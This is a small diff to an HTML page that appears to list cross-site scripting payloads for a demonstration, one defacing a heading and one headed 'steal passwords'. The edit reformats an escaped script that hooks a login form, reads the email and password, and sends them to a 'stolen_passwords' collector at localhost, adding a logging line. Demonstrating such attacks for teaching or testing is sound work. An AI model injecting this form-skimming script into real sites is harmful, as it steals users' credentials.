@@ -12,4 +12,15 @@
 <h3> change the heading </h3>
 &lt;script&gt; $('.navbar-brand')[0].innerHTML=&quot;Hack the planet!&quot; &lt;/script&gt;
 <h3>steal passwords</h3>
-&lt;script&gt;<br/>$( &quot;#login_form&quot; ).submit(function( event ) {<br/>  var email = $( &quot;#user_email &quot; )[0].value<br/>  var password = $( &quot;#user_password &quot; )[0].value<br/>  url = &quot;http://localhost:3000/stolen_passwords/create?email=&quot;+ email + &quot;&amp;password=&quot; + password<br/> $.get(url)<br/>});<br/>&lt;/script&gt; 
+
+
+&lt;script&gt;<br/>
+  $( &quot;#login_form&quot; ).submit(function( event ) {<br/>
+    var email = $( &quot;#user_email &quot; )[0].value<br/>
+    var password = $( &quot;#user_password &quot; )[0].value<br/>
+    url = &quot;http://localhost:3000/stolen_passwords/create?email=&quot;+ email + &quot;&amp;password=&quot; + password<br/>
+    console.log("sending evil!" + password)<br/>
+    $.get(url)<br/>
+  });<br/>
+
+&lt;/script&gt; 
